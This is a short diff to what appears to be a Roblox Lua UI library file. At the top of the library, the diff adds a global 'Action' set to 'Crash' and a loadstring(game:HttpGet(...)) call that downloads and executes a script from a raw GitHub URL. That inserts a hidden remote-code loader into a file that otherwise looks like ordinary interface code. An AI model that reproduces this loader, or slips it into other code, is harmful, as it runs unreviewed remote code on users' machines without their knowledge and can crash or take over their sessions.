@@ -1,4 +1,5 @@
-
+getgenv().Action = "Crash" -- Available Action: "Rejoin", "Crash"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jianlobiano/Triple-T/refs/heads/main/Spy%3F"))()
 local Library = {}
 local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
